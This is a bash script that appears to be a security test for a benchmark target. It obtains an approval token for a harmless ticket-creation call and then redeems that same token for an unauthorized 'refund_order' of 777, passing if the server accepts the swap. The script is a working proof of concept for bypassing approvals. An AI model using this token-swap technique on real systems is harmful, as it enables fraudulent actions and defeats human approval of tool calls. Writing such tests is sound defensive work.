#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
tok=$(login user1@bench.local User123!)
ap=$(curl -fsS -H "content-type: application/json" -H "authorization: Bearer $tok" -X POST -d '{"runId":"benign","tool":"create_ticket","args":{"title":"ok"}}' "$TARGET/api/approvals" | node -e "let s='';process.stdin.on('data',c=>s+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(s).token))")
payload=$(node -e 'process.stdout.write(JSON.stringify({runId:"evil",tool:"refund_order",token:process.argv[1],args:{orderId:"ord-acme-1",amount:777}}))' "$ap")
out=$(curl -fsS -H "content-type: application/json" -H "authorization: Bearer $tok" -X POST -d "$payload" "$TARGET/api/approvals/redeem")
printf "%s" "$out" | contains_http "refund_order" && printf "%s" "$out" | contains_http "777"
